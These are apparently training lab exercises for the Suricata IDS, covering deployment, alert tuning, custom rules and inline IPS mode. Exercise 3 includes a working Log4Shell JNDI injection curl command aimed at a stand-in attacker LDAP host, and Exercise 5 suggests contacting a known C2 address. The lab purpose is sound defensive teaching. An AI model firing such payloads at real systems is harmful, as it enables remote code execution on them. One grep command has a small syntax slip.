# Suricata in Practice: Real-World Use Case Exercises

---

## Lab Setup Prerequisites

Before beginning, ensure your lab environment has the following:
1.  A Linux VM (e.g., Ubuntu Server 22.04 LTS) with Suricata installed.
2.  At least one network interface configured in promiscuous mode for monitoring. A `span` port or a virtual network (e.g., NAT Network in VirtualBox) is ideal.
3.  Another VM (e.g., a "victim" machine with a vulnerable service or a simple web server) to generate traffic.
4.  An "attacker" machine (e.g., Kali Linux) or the ability to generate simulated malicious traffic from your host.
5.  Basic knowledge of the Linux command line, `grep`, `awk`, and `jq` (for JSON log parsing).

---

## Exercise 1: Basic Deployment & Rule Management

**Learning Objective:** To understand the core components of a Suricata configuration and perform basic rule management.

**Scenario:** You are a junior security analyst tasked with deploying Suricata on a new sensor. Your first job is to validate the configuration and enable a basic set of rules.

**Tasks:**

1.  **Configuration Validation:**
    *   Locate the main Suricata configuration file (typically `/etc/suricata/suricata.yaml`).
    *   Identify and document the following key variables:
        *   `HOME_NET`: What network is defined as "home" (trusted)?
        *   `EXTERNAL_NET`: What is defined as the external network?
        *   The default log directory.
        *   The interface Suricata is set to monitor (`af-packet` or `pcap`).
    *   Run `suricata -T -c /etc/suricata/suricata.yaml -v` to test the configuration. Resolve any errors before proceeding.

2.  **Rule Acquisition & Activation:**
    *   Using the `suricata-update` tool, download the latest Emerging Threats (ET) Open rule set.
    *   List the rule files that were downloaded (check `/var/lib/suricata/rules/`).
    *   In `suricata.yaml`, ensure the `default-rule-path` and `rule-files` directives are correctly pointing to your downloaded rules.

3.  **Service Management:**
    *   Start the Suricata service and enable it to run on boot.
    *   Verify it is running and listening on the correct interface using `ps aux | grep suricata` and `ip link show`.

**Deliverable:** A short report (2-3 paragraphs) explaining your configuration choices, the output of the configuration test, and a list of the top 5 rule categories you obtained from `suricata-update`.

---

## Exercise 2: Tuning for Your Environment

**Learning Objective:** To learn the critical skill of tuning Suricata to reduce false positives and focus on relevant threats.

**Scenario:** After a week of running, your Suricata instance is generating thousands of alerts, many of which are irrelevant to your environment (e.g., alerts for Microsoft protocols on a purely Linux network).

**Tasks:**

1.  **Baseline Alert Analysis:**
    *   Let Suricata run for 10-15 minutes while generating normal background traffic (browse the web from your "victim" VM).
    *   Analyze the `fast.log` file. Use command-line tools to count the number of unique alerts: `grep -oP '(?<=\[\*\*\] ).*?(?= \[\*\*\]') fast.log | sort | uniq -c | sort -nr`
    *   Identify the top 3 most frequent alerts.

2.  **Rule Suppression (Using `sid`):**
    *   Choose one alert from your top 3 that is a clear false positive for your lab (e.g., `ET POLICY MS Terminal Server Server-to-Client traffic detected` if you don't use RDP).
    *   Find the Rule SID (Signature ID) for this alert in the `eve.json` log using `jq`: `jq 'select(.alert .signature | contains("Terminal Server")) | .alert .signature_id' eve.json | head -n 1`
    *   Create a local Suricata rule file (e.g., `/etc/suricata/local-rules/suppress.rules`) and add a line to drop this alert: `suppress gen_id 1, sig_id 2016401;`
    *   Reload Suricata rules with `suricatasc -c reload-rules`.

3.  **Tuning with Thresholds:**
    *   Identify a noisy alert that should not be completely suppressed but limited (e.g., multiple SSH connection attempts).
    *   In your `suppress.rules` file, use a `threshold` to limit this alert to once per source IP per hour. Example: `threshold gen_id 1, sig_id 2001219, type threshold, track by_src, count 1, seconds 3600`

**Deliverable:** A list of the top 5 alerts from your baseline analysis. For two of them, provide the SID and the exact suppression/threshold rule you wrote. Explain *why* you chose to suppress or threshold each one.

---

## Exercise 3: Detecting a Real-World Exploit Attempt

**Learning Objective:** To witness Suricata detecting a live, simulated attack and to analyze the resulting alerts in depth.

**Scenario:** Intelligence suggests that a known vulnerability in a web application (e.g., Apache Log4j - CVE-2021-44228) is being actively exploited. You need to verify your Suricata deployment can detect such an attack.

**Tasks:**

1.  **Prepare the Environment:**
    *   Ensure your "victim" VM is running a vulnerable service. A simple, safe option is to use a deliberately vulnerable container from Docker Hub, like `vulhub/log4shell` (for Log4j).
    *   Confirm the service is accessible from your "attacker" VM.

2.  **Simulate the Attack:**
    *   From your "attacker" VM, use a tool like `curl` to send a malicious payload targeting the vulnerability.
        *   *Example for Log4j simulation:* `curl -H 'User-Agent: ${jndi:ldap://attacker-ip:1389/a}' http://victim-ip:8080`
    *   Alternatively, use a scanner like `nucleus` or `metasploit` with a relevant module to generate the exploit traffic.

3.  **Analyze the Alert:**
    *   Immediately check the `fast.log` for a new alert.
    *   Find the corresponding entry in the `eve.json` log. Use `jq` to pretty-print the entire event related to this alert.
    *   Document the following from the `eve.json` entry:
        *   Timestamp
        *   Source and Destination IPs & Ports
        *   Protocol (e.g., TCP, HTTP)
        *   Full Alert Signature and SID
        *   The payload that triggered the alert (found in `http.http_body` or `tcp.payload` in hex).

**Deliverable:** A screenshot or formatted text block of the complete `eve.json` entry for the exploit detection. Write a brief incident report (who, what, when, where) based solely on the data in this log entry.

---

## Exercise 4: Writing a Custom Rule

**Learning Objective:** To create a tailored detection signature for a specific piece of malware or a suspicious activity unique to your environment.

**Scenario:** Your company's custom internal application, `payroll-app`, uses a specific secret header for API authentication: `X-API-Key: internal-payroll-system-v1`. Any external request with this header is highly suspicious.

**Tasks:**

1.  **Craft the Rule:**
    *   Write a custom Suricata rule that alerts on any HTTP traffic from the `$EXTERNAL_NET` to any server that contains the header `X-API-Key: internal-payroll-system-v1`.
    *   The rule should have the following properties:
        *   `msg`: "SUSPICIOUS - Internal API Key Used from External Network"
        *   A relevant `classtype` (e.g., `trojan-activity` or `policy-violation`).
        *   Priority: `1` (High).
        *   SID: `1000001` (within the local rule range).

2.  **Deploy and Test the Rule:**
    *   Save this rule to `/etc/suricata/local-rules/custom.rules`.
    *   Reload the Suricata rules.
    *   From your "attacker" VM (simulating the `$EXTERNAL_NET`), use `curl` to send a request to your victim's web server that includes the malicious header.
    *   Verify the alert is triggered in `fast.log` and `eve.json`.

**Deliverable:** Provide the complete, functional Suricata rule you wrote. Include a screenshot of the `curl` command you used for testing and the corresponding alert from the logs.

---

## Exercise 5: Implementing Inline IPS Mode

**Learning Objective:** To configure Suricata from passive IDS mode to active IPS mode, enabling it to block threats in real-time.

**Scenario:** Management has approved a change to move Suricata from a monitoring-only role to an active Intrusion Prevention System (IPS) to automatically block known exploit attempts.

**Tasks:**

**WARNING:** This exercise requires a specific network setup, typically using two NICs and acting as a bridge/router. It is best done in a virtualized environment where you can easily create a network topology.

1.  **Network Configuration:**
    *   Set up a network topology where the Suricata VM has two interfaces: one connected to the "external" network (simulating the internet) and one connected to the "internal" network (where the victim server resides). Suricata will bridge these two interfaces.

2.  **Suricata Configuration:**
    *   In `suricata.yaml`, change the `af-packet` (or `pcap`) interface configuration to use `ips-mode: yes`.
    *   Configure the `nfq` or `af-packet` load-balancing if using multiple cores.
    *   Set the `mpm-algo: ac` for the pattern matcher, which is better suited for IPS.

3.  **Enable Drop Rules:**
    *   Identify a rule from the ET set that is high-confidence and low false-positive, such as one for a known malware beacon (`ET MALWARE`).
    *   Change the rule's action from `alert` to `drop`. You can do this by creating a drop rule in your `local.rules` file or by using the `suricata-update` `--local` rules with `drop` action.
    *   Reload Suricata.

4.  **Test the IPS:**
    *   From the "attacker" VM, attempt to trigger the rule you set to `drop` (e.g., try to connect to a known C2 server IP from a threat intelligence feed).
    *   Use `tcpdump` on the victim server to confirm that the malicious packets are not being received. The connection should be reset or silently dropped.

**Deliverable:** A diagram of your test network topology. A copy of the relevant section of your `suricata.yaml` showing the IPS configuration for the interface. The SID and text of the rule you chose to convert to `drop`, and an explanation of *why* it was a good candidate for blocking.
